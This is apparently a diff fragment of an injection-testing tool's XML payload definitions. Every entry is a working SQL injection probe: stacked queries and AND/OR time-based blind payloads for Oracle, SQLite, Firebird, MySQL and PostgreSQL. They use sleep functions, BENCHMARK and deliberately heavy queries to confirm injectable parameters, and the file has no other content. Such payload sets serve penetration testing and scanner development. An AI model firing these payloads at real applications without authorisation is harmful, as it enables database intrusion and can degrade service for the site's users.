+        <level>5</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; EXEC DBMS_LOCK.SLEEP([SLEEPTIME].00);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle stacked queries</title>
+        <stype>4</stype>
+        <level>5</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; EXEC USER_LOCK.SLEEP([SLEEPTIME].00);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 stacked queries</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))));</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- TODO: works only on Firebird >= 3.0? -->
+        <title>Firebird stacked queries</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <request>
+            <payload>; SELECT COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6;</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+    <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
+    <!-- End of stacked queries tests -->
+
+
+    <!-- AND time-based blind tests -->
+    <test>
+        <title>MySQL &gt; 5.0.11 AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 AND time-based blind</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND PG_SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 AND time-based blind</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- TODO: works only on Firebird >= 3.0? -->
+        <title>Firebird AND time-based blind</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>AND (COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+    <!--
+         NOTE: there is no way to perform this test against Microsoft SQL
+         Server, Sybase, Oracle or PostgreSQL < 8.2
+    -->
+    <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
+    <!-- End of AND time-based blind tests -->
+
+
+    <!-- OR time-based blind tests -->
+    <test>
+        <title>MySQL &gt; 5.0.11 OR time-based blind</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>OR SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 OR time-based blind</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>OR BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 OR time-based blind</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>OR PG_SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite &gt; 2.0 OR time-based blind</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>OR LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(10000000))))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <!-- TODO: works only on Firebird >= 3.0? -->
+        <title>Firebird OR time-based blind</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <request>
+            <payload>OR (COUNT(*) FROM RDB$DATABASE AS T1, RDB$FIELDS AS T2, RDB$FUNCTIONS AS T3, RDB$TYPES AS T4, RDB$FORMATS AS T5, RDB$COLLATIONS AS T6) > 0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+    <!--
+         NOTE: there is no way to perform this test against Microsoft SQL
+         Server, Sybase, Oracle or PostgreSQL < 8.2
+    -->
+    <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
+    <!-- End of OR time-based blind tests -->
+
+
+</root>
